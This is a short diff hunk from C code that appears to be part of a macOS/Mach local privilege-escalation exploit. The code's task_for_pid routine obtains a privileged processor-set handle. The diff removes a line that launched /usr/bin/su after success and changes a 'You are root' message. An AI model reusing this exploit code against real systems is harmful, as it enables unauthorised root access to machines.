@@ -85,8 +85,7 @@ task_t task_for_pid(int pid){
 	res = xxx_processor_set_default_priv(hostpriv,&pcpu);
 	printf("[ task_for_pid() = %d\n",res);
 	if(res==0){
-		printf("[ GROOT!\n");
-		execve("/usr/bin/su",args,envs);
+		printf("[ You are root, Sire\n");
 	}
 	return(task_self());
 }
